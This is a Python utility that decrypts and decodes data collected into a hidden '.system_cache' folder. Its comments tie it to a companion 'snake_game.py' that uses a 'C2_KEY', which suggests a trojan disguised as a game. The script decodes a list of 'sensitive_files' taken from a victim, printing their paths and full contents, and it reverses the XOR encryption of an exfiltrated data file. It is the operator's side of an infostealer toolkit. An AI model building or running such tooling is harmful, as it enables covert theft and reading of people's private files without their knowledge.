#!/usr/bin/env python3
"""
Script to decrypt/decode collected data from .system_cache
"""

import json
import base64
import hashlib
import sys
import os

# Configuration (must match snake_game.py)
C2_KEY = "default_key_change_me"  # Change this if you changed it in snake_game.py

def decrypt_data(encrypted_data, key=None):
    """Decrypt XOR encrypted data"""
    if key is None:
        key = C2_KEY
    key_hash = hashlib.sha256(key.encode()).digest()
    data = base64.b64decode(encrypted_data)
    decrypted = bytearray()
    for i, byte in enumerate(data):
        decrypted.append(byte ^ key_hash[i % len(key_hash)])
    return bytes(decrypted).decode('utf-8', errors='ignore')

def decode_base64_content(content):
    """Decode base64-encoded file content"""
    try:
        decoded = base64.b64decode(content)
        return decoded.decode('utf-8', errors='ignore')
    except Exception as e:
        return f"Error decoding: {e}"

def decrypt_comprehensive_data():
    """Decode all base64 content in comprehensive_data.json"""
    data_file = ".system_cache/comprehensive_data.json"
    
    if not os.path.exists(data_file):
        print(f"Error: {data_file} not found")
        return
    
    print(f"Reading {data_file}...")
    with open(data_file, 'r', encoding='utf-8') as f:
        data = json.load(f)
    
    # Decode sensitive files
    if 'sensitive_files' in data:
        print("\n=== Decoding Sensitive Files ===\n")
        for i, file_info in enumerate(data['sensitive_files']):
            if 'content' in file_info and file_info['content']:
                print(f"File {i+1}: {file_info['path']}")
                print(f"Size: {file_info['size']} bytes")
                print(f"Modified: {file_info['modified']}")
                print("Content:")
                print("-" * 60)
                decoded = decode_base64_content(file_info['content'])
                print(decoded)
                print("-" * 60)
                print()
    
    # Save decoded version
    output_file = ".system_cache/comprehensive_data_decoded.json"
    print(f"\nSaving decoded version to {output_file}...")
    
    # Create decoded copy
    decoded_data = data.copy()
    if 'sensitive_files' in decoded_data:
        for file_info in decoded_data['sensitive_files']:
            if 'content' in file_info and file_info['content']:
                file_info['content_decoded'] = decode_base64_content(file_info['content'])
    
    with open(output_file, 'w', encoding='utf-8') as f:
        json.dump(decoded_data, f, indent=2, default=str)
    
    print(f"Decoded data saved to {output_file}")

def decrypt_encrypted_file():
    """Decrypt encrypted_data.bin"""
    encrypted_file = ".system_cache/encrypted_data.bin"
    
    if not os.path.exists(encrypted_file):
        print(f"Error: {encrypted_file} not found")
        return
    
    print(f"Reading {encrypted_file}...")
    with open(encrypted_file, 'r', encoding='utf-8') as f:
        encrypted_content = f.read()
    
    print("Decrypting...")
    try:
        decrypted = decrypt_data(encrypted_content)
        print("Decryption successful!")
        
        # Try to parse as JSON
        try:
            data = json.loads(decrypted)
            output_file = ".system_cache/encrypted_data_decrypted.json"
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, default=str)
            print(f"Decrypted JSON saved to {output_file}")
        except:
            # Not JSON, save as text
            output_file = ".system_cache/encrypted_data_decrypted.txt"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(decrypted)
            print(f"Decrypted text saved to {output_file}")
    except Exception as e:
        print(f"Decryption failed: {e}")
        print("Make sure C2_KEY matches the one used in snake_game.py")

def main():
    print("=" * 60)
    print("Data Decryption/Decoding Tool")
    print("=" * 60)
    print()
    
    if len(sys.argv) > 1:
        if sys.argv[1] == "encrypted":
            decrypt_encrypted_file()
        elif sys.argv[1] == "comprehensive":
            decrypt_comprehensive_data()
        else:
            print("Usage:")
            print("  python decrypt_data.py              # Decode comprehensive_data.json")
            print("  python decrypt_data.py comprehensive  # Decode comprehensive_data.json")
            print("  python decrypt_data.py encrypted      # Decrypt encrypted_data.bin")
    else:
        # Default: decode comprehensive data
        decrypt_comprehensive_data()

if __name__ == "__main__":
    main()

